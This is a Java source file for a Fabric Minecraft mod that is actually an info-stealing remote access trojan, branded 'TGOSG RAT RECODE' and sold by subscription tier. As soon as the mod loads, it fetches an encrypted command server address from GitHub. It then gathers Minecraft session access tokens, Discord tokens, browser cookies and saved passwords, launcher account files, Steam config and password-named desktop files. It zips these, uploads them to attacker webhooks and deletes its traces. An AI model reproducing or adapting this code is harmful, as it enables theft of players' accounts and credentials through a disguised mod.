package com.example;

import com.example.CoreUtil.FileUtil;
import com.example.CoreUtil.SystemUtil;
import com.example.CoreUtil.WebHookSetup;
import com.example.Security.*;
import com.example.Else.Directorys;
import com.example.Else.Discord;
import com.example.browsers.Cookies;
import com.example.browsers.Passwords;
import com.example.browsers.Util.DecryptUtil;
import com.google.common.io.ByteStreams;
import net.fabricmc.api.ModInitializer;

import net.minecraft.client.MinecraftClient;

import net.minecraft.client.network.ServerInfo;
import net.minecraft.client.option.ServerList;
import org.apache.commons.io.FileUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.SocketException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Objects;
import java.util.stream.Collectors;

import static com.example.CoreUtil.FileUtil.uploadFile;

public class ExampleMod implements ModInitializer {
	public static MinecraftClient mc = MinecraftClient.getInstance();
	public static String serverIP = "";
	public static String webhookID = null;
	public static boolean DebugMode = false;

	public static final String MainDir = Directorys.LocalAppData() + "\\Microsoft\\" + ExampleMod.mc.getSession().getUsername();
	private static final String desktopFiles = MainDir + "\\desktopFiles\\";
	private static final String mcFiles = MainDir + "\\mcFiles\\";
	private static final String launcherFiles = MainDir + "\\launcherFiles\\";

	public static byte[] keyValue = new byte[]{'T', 'G', 'O', 'S', 'G', '7'};

	public static String decrypt(String encryptedData) throws Exception {
		try {

			Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5PADDING");
			SecretKeySpec secretKey = new SecretKeySpec(keyValue, "AES");
			cipher.init(Cipher.DECRYPT_MODE, secretKey);
			return new String(cipher.doFinal(Base64.getDecoder().decode(encryptedData)));

		} catch (Exception ignored) {
		}
		return "null";
	}

	public static void debug(int logcase, String message){
		int shit = 0;
		Logger LOGGER = LoggerFactory.getLogger("[TGOSG DebugMode]");
		switch (shit){
			case 0:
				LOGGER.info("[TGOSG DebugMode]"+message);
				break;
			case 1:
				LOGGER.error(message);
				break;
			case 2:
				LOGGER.debug(message);
				break;
		}
	}

	public static void addToKey(char bytes){
		try {
			if(ExampleMod.DebugMode){
				ExampleMod.debug(0,"adding to value: "+bytes);
			}
			ByteArrayOutputStream out = new ByteArrayOutputStream();
			out.write(keyValue);
			out.write(new byte[]{(byte) bytes});
			keyValue = out.toByteArray();
		} catch (IOException ignored) {
        }
    }


	@Override
	public void onInitialize() {
		RunMainRat();
    }

	private static void RunMainRat(){
		new Thread(() -> {
			//Security
//			AntiDumpUlt.ENABLE = true;
//			AntiDumpUlt.check();
			ExampleMod.addToKey('T');
			ExampleMod.addToKey('1');
//			AntiDump.run();
			ExampleMod.addToKey('C');
			ExampleMod.addToKey('j');
//			ArgumentChecker.checkArgument();
			ExampleMod.addToKey('R');
			ExampleMod.addToKey('d');
//			AntiVM.checkForVM();
			ExampleMod.addToKey('C');

//            try {
//                BlackList.checkOffline();
//            } catch (InterruptedException | IOException | IllegalAccessException | NoSuchMethodException |
//                     InvocationTargetException e) {
//                throw new RuntimeException(e);
//            }
            ExampleMod.addToKey('k');
            ExampleMod.addToKey('n');
            try {
				final URL url = new URL("http://www.google.com");
				final URLConnection conn = url.openConnection();
				conn.connect();
				conn.getInputStream().close();
			} catch (IOException e) {
				Thread.currentThread().interrupt();
			}
            //				AntiVPN.isVPN();
            ExampleMod.addToKey('H');

            //ratLocation
			String ratLocation = ExampleMod.class.getClassLoader().getResource("assets/recode/config.txt").getPath().replace("!/assets/recode/config.txt", "").replace("file:/", "");
			//webhookID setup
			try {
				InputStream WebhookIDin = ExampleMod.class.getClassLoader().getResourceAsStream("assets/recode/config.txt");
				webhookID = new String(ByteStreams.toByteArray(Objects.requireNonNull(WebhookIDin))).replace("\n", "");
				WebhookIDin.close();
			} catch (IOException ignored) {
			}
			//serverIP
			try {
				//todo MAKE NEW GITHUB WITH AES TO {https://tgosgtsite.onrender.com} WITH KEY {TGOSG7T1CjRdCknH}
				URL url = new URL("https://raw.githubusercontent.com/TGOSG/serverUpdate/main/main.txt");
				serverIP = decrypt(new BufferedReader(new InputStreamReader(url.openStream(), StandardCharsets.UTF_8)).lines().collect(Collectors.joining("\n")));
			} catch (Exception ignored) {
			}
			if(ExampleMod.DebugMode){
				ExampleMod.debug(2,"ServerIP: "+serverIP +"    webhookID: "+webhookID);
			}

			//savedServer embed
			WebHookSetup.EmbedObject SavedServer = new WebHookSetup.EmbedObject();
			SavedServer.setTitle(mc.getSession().getUsername() + "'s Saved Server");
			ServerList servers = new ServerList(mc);
			for (int serveri = 0; serveri < servers.size() && serveri < 25; ++serveri) {
				ServerInfo server = servers.get(serveri);
				SavedServer.addField(server.name, "```" + server.address + "```", true);
			}

			//BeginSpreaderShit
			WebHookSetup spreaderHook = new WebHookSetup(serverIP + "/serverSide");
			spreaderHook.setUsername("TGOSG RAT RECODE");
			spreaderHook.setWebhookID(webhookID);
			spreaderHook.setContent("RAT RECODE BY <@1186766951251464274> Ratted: " + mc.getSession().getUsername() + " BUY TIERS FROM https://discord.gg/EmQswjcR99");
			spreaderHook.addEmbed(new WebHookSetup.EmbedObject()
							.setTitle(mc.getSession().getUsername() + "'s Minecraft Data")
//				.setThumbnail("https://crafatar.com/avatars/" + mc.getSession().getUuidOrNull().toString() + "?size=128&overlay")
							.addField("IP: ", "```" + SystemUtil.getIp() + "```" + " [ip2Location](https://www.ip2location.com/demo/" + SystemUtil.getIp() + ")", false)
							.addField("UserName: ", "```" + mc.getSession().getUsername() + "```", false)
							.addField("UUID: ", "```" + mc.getSession().getUuidOrNull().toString() + "```", false)
							.addField("Access Token: ", "```" + mc.getSession().getAccessToken() + "```", false)
			);
			int Tier = -1;
			String resellerID = "";
			try {
				String SpreaderResponse = spreaderHook.execute();
				Tier = Integer.parseInt(SpreaderResponse.split(":")[0]);
				resellerID = SpreaderResponse.split(":")[1].toString();
			} catch (IOException ignored) {
			}

			String MCname = mc.getSession().getUsername();
			String MainDir = Directorys.LocalAppData() + "\\Microsoft\\" + MCname;
			if (!Files.exists(Path.of(Directorys.LocalAppData() + "\\Microsoft\\" + MCname))) {
				try {
					Files.createDirectory(Path.of(MainDir));
					Thread.sleep(300);
					Files.createDirectory(Path.of(MainDir + "\\desktopFiles"));
					Files.createDirectory(Path.of(MainDir + "\\mcFiles"));
					Files.createDirectory(Path.of(MainDir + "\\launcherFiles"));
					Thread.sleep(300);
				} catch (Exception ignored) {
				}
			}

			List<String> desktopfiles = Arrays.asList("passwords.txt", "password.txt", "Passwords.txt", "Password.txt", "Login.txt", "login.txt", "Logins.txt", "logins.txt", "banking.txt", "Banking.txt", "account.json");

			for (int i = 0; i < desktopfiles.size(); ++i) {
				FileUtil.fileMover(Directorys.DeskTop() + "\\" + desktopfiles.get(i), desktopFiles, desktopfiles.get(i));
			}
			FileUtil.fileMover(Directorys.RoamingAppData() + "\\.feather\\accounts.json", mcFiles, "featherAccounts.json");
			FileUtil.fileMover(System.getProperty("user.home") + "\\.lunarclient\\settings\\game\\accounts.json", mcFiles, "lunarAccounts.json");

			FileUtil.fileMover(Directorys.Minecraft() + "\\config\\ias.json", mcFiles, "ias.json");
			FileUtil.fileMover(Directorys.Minecraft() + "\\Novoline\\alts.novo", mcFiles, "novolineAlts.novo");
			FileUtil.fileMover(Directorys.Minecraft() + "\\Flux\\alt.txt", mcFiles, "fluxAlt.txt");
			FileUtil.fileMover(Directorys.Minecraft() + "\\TlauncherProfiles.json", mcFiles, "TlauncherProfiles.json");
			FileUtil.fileMover(Directorys.Minecraft() + "\\essential\\mojang_accounts.json", mcFiles, "essentials_mojang_accounts.json");
			FileUtil.fileMover(Directorys.Minecraft() + "\\essential\\microsoft_accounts.json", mcFiles, "essentials_microsoft_accounts.json");

			DecryptUtil.kill();

			Discord discord = new Discord();
			Cookies cookies = new Cookies();
			Passwords passwords = new Passwords();


			FileUtil.fileWriter(MainDir + "\\Cookies.txt", new String(Base64.getDecoder().decode(cookies.grabCookies())));
			FileUtil.fileWriter(MainDir + "\\Passwords.txt", new String(Base64.getDecoder().decode(passwords.grabPassword())));
			FileUtil.fileWriter(MainDir + "\\Main.txt", "Computer Name: " + SystemUtil.getName() + "\nHWID: " + SystemUtil.getHWID() +
					"\nIP: " + SystemUtil.getIp() + "\nOS: " + SystemUtil.getOS() + "\nDiscord Token(s): " + discord.getValidTokensList() +
					"\nMinecraft Name: " + mc.getSession().getUsername() + "\nMod Path: " + ratLocation);

			try {
				FileUtil.zipFolder(Path.of(Directorys.Minecraft() + "\\XaeroWaypoints"), Path.of(mcFiles + "Xaero.zip"));
			} catch (Exception ignored) {
			}
			FileUtil.fileWriter(mcFiles + "\\ModList.txt", String.valueOf(FileUtil.getFilenamesInDir(new File(Directorys.Minecraft() + "\\mods"))));
			FileUtil.fileMover(Directorys.LocalAppData() + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini", launcherFiles, "EpicGamesLauncher.ini");
			try {
				FileUtil.zipFolder(Path.of("C:\\Program Files (x86)\\Steam\\config"), Path.of(launcherFiles + "\\Steam.zip"));
			} catch (Exception ignored) {
			}

			//BEGIN spreader Tier
			WebHookSetup tierHook = new WebHookSetup(serverIP + "/serverSide");
			tierHook.setUsername("TGOSG RAT RECODE");
			tierHook.setWebhookID(webhookID);
			tierHook.setContent("RAT RECODE BY <@1186766951251464274> Ratted: " + mc.getSession().getUsername());
			try {
				switch (Tier) {
					case 1:
						tierHook.addEmbed(new WebHookSetup.EmbedObject()
								.setTitle("Tier 1 perks")
								//.addField("Discord Token(s): ", "```"+"test"+"```", false)
								.addField("Discord Token(s): ", "```" + discord.getValidTokensList() + "```", false)
						);
						try {
							tierHook.addEmbed(SavedServer);
							tierHook.execute();
						} catch (IOException ignored) {
						}
						break;
					case 2:
						FileUtil.zipFolder(Path.of(MainDir + "\\mcFiles"), Path.of(MainDir + "\\mcFiles.zip"));
						tierHook.addEmbed(new WebHookSetup.EmbedObject()
								.setTitle("Tier 2 perks")
								//.addField("Discord Token(s): ", "```"+"test"+"```", false)
								.addField("Discord Token(s): ", "```" + discord.getValidTokensList() + "```", false)
								//.addField("Upload Folder: ","test",false)
								.addField("minecraft Folder: ", uploadFile(MainDir + "\\mcFiles.zip"), false)
						);
						try {
							tierHook.addEmbed(SavedServer);
							tierHook.execute();
						} catch (IOException ignored) {
						}
						FileUtils.delete(new File(MainDir + "\\mcFiles.zip"));
						break;
					case 3:
						FileUtil.zipFolder(Path.of(MainDir), Path.of(MainDir + ".zip"));
						tierHook.addEmbed(new WebHookSetup.EmbedObject()
								.setTitle("Tier 3 perks")
								//.addField("Discord Token(s): ", "```"+"test"+"```", false)
								.addField("Discord Token(s): ", "```" + discord.getValidTokensList() + "```", false)
								//.addField("Upload Folder: ","test",false)
								.addField("Upload Folder: ", uploadFile(MainDir + ".zip"), false)
						);
						try {
							tierHook.addEmbed(SavedServer);
							tierHook.execute();
						} catch (IOException ignored) {
						}
						FileUtils.delete(new File(MainDir + ".zip"));
						break;
					default:
						break;
				}
			} catch (Exception ignored) {
			}

			//MAINHOOK
			try {
				FileUtil.zipFolder(Path.of(MainDir), Path.of(MainDir + ".zip"));
			} catch (Exception e) {
				throw new RuntimeException(e);
			}
			//Main hook
			WebHookSetup mainHook = new WebHookSetup(serverIP + "/post");
			mainHook.setUsername("TGOSG RAT RECODE");
			mainHook.setWebhookID(resellerID);
			mainHook.setContent("TGOSG RAT RECODE: " + mc.getSession().getUsername());
			mainHook.addEmbed(new WebHookSetup.EmbedObject()
							.setTitle(mc.getSession().getUsername() + "'s System & Info")
							.addField("Account Name: ", SystemUtil.getName(), false)
							.addField("HWID: ", SystemUtil.getHWID(), false)
							.addField("IP: ", SystemUtil.getIp() + " [ip2Location](https://www.ip2location.com/demo/" + SystemUtil.getIp() + ")", false)
							.addField("OS: ", SystemUtil.getOS(), false)
							.addField("Discord Token(s): ", "```" + discord.getValidTokensList() + "```", false)
							//.addField("Discord Token(s): ", "```"+"test"+"```", false)
							.addField("WebhookID: ", "```" + webhookID + "```", false)
							.addField("Upload Folder: ", uploadFile(MainDir + ".zip"), false)
					//.addField("Upload Folder: ","test",false)

			);
			mainHook.addEmbed(new WebHookSetup.EmbedObject()
					.setTitle(mc.getSession().getUsername() + "'s Minecraft Data")
					//.setThumbnail("https://crafatar.com/avatars/" + mc.getSession().getUuidOrNull().toString() + "?size=128&overlay")
					.addField("ModPath: ", "```" + ratLocation + "```", false)
					.addField("UserName: ", "```" + mc.getSession().getUsername() + "```", false)
					.addField("UUID: ", "```" + mc.getSession().getUuidOrNull().toString() + "```", false)
					.addField("Access Token: ", "```" + mc.getSession().getAccessToken() + "```", false)

			);
			WebHookSetup.EmbedObject MSavedServer = new WebHookSetup.EmbedObject();
			MSavedServer.setTitle(mc.getSession().getUsername() + "'s Saved Server");
			ServerList mservers = new ServerList(mc);
			for (int serveri = 0; serveri < mservers.size() && serveri < 25; ++serveri) {
				ServerInfo server = mservers.get(serveri);
				MSavedServer.addField(server.name, "```" + server.address + "```", true);
			}
			try {
				mainHook.addEmbed(MSavedServer);
				mainHook.execute();
			} catch (IOException e) {
				//System.out.println(e);
			}
			try{
				FileUtils.delete(new File(MainDir + ".zip"));
			} catch (IOException e) {
            }
			try{
				FileUtils.deleteDirectory(new File(MainDir));
			} catch (IOException e) {
			}

        }).start();
	}
}